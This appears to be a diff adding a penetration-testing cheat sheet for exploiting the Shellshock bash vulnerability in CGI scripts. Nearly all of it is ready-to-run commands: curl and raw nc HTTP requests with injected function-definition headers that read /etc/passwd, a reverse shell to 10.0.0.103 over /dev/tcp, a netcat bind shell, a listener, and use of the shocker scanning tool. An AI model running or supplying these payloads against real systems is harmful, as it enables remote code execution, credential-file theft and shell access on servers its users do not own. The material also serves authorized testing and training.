@@ -1,0 +1,39 @@
+# Exploiting Shellshock
+
+# Manual Method as method below doesn't support Proxy at the moment
+
+1. curl -v 10.0.0.xx/cgi-bin/index.bash OR curl -v 127.0.0.1/cgi-bin/index.bash -x proxy:port
+
+That's just a trial.
+2. Do this -
+
+curl -v 127.0.0.1/cgi-bin/status -x 10.0.0.xx:3128 -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+
+
+And we see the response with what we wanted!
+
+Now let's try to get a reverse shell back -
+
+3. curl -v 127.0.0.1/cgi-bin/status -x 10.0.0.xx:3128 -H "custom:() { ignored; }; echo Content-Type: text/html; echo ;/bin/sh -i >& /dev/tcp/10.0.0.103/443 0>&1"
+
+And we have a reverse shell!
+Instead of sh try /bin/sh or /bin/bash and instead of nc try /bin/nc or /bin/netcat etc.
+
+
+#A tool to find and exploit servers vulnerable to Shellshock:
+
+git clone https://github.com/nccgroup/shocker
+
+./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
+
+# cat file (view file contents)
+
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+
+# Shell Shock run bind shell
+
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+
+#Shell Shock reverse Shell
+
+nc -l -p 443
